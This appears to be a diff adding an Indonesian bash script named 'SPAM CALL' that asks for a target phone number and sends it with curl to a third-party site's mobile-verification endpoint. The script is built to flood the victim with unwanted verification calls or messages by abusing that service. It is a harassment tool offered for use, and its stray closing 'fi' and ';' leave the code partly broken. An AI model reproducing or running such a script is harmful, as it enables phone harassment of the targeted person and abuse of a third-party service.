@@ -1,0 +1,37 @@
+clear
+
+red="\033[1;31m"
+blu="\033[1;96m"
+whi="\e[1;37m"
+
+sleep 1
+echo
+echo "${blu} [!] Loading Cuk. . ."
+sleep 1
+echo "${blu} Orang sabar di sayang tuhan:)"
+echo
+figlet Succes | lolcat
+sleep 10
+clear
+figlet SPAM CALL | lolcat
+sleep 1
+echo
+sleep 1
+echo "${red}══════════════════════════════════"
+echo "${blu} Author  : MR.GRIMX72"
+echo "${blu} Youtube : Belum Ada"
+echo "${blu} Version : Spam Version Beta"
+echo "${red}══════════════════════════════════\n${blu}"
+sleep 1
+read -p "[+] Masukan No Target : " nomor
+link="https://id.jagreward.com/member/verify-mobile/$nomor"
+sleep 1
+echo "${blu}[+] Spam Call Succes:)"
+curl -s $link
+sleep 1
+echo
+figlet Selesai | lolcat
+exit
+fi
+;
+echo
